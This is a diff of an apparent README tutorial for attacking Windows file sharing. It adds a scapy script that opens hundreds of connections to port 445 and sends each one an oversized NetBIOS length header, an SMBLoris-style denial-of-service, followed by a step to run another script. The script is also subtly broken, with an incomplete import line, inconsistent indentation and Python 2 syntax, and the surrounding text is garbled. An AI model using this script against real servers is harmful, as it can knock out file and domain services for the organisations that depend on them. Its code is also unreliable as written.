@@ -30,9 +30,37 @@ Normal Works on All systems Linux !! Redhat kali And And And And Etc!!
 ------------------------------------------------------------------------------------------------------||
 ------------------------------------------------------------------------------------------------------||
 
-1 >_  Now we use
+1 >_  Now we use smb3.py 
+```
+from scapy.all import
+import sys
+
+    p0 = int(sys.argv[1])
+
+    conf.L3socket
+    conf.L3socket=L3RawSocket
+
+    i = IP()
+    i.dst = "192.168.1.4"
+    t = TCP()
+    t.dport = 445
+
+    for p in range(p0, p0+700):
+      print p
+      t.sport = p
+      t.flags = "S"
+
+      r = sr1(i/t)
+      rt = r[TCP]
+      t.ack = rt.seq + 1
+      t.seq = rt.ack
+      t.flags = "A"
+      sbss = '\x00\x01\xff\xff'
+      send(i/t/sbss)
+
+
 
 2 >_ Now we go to run rest.sh
 
 ![screenshot from 2017-08-09 19-19-12](https://user-images.githubusercontent.com/25440152/29142117-de3c8ec2-7d1e-11e7-8144-20261cf78916.png)
-
+# Next >_ let's go To arrange
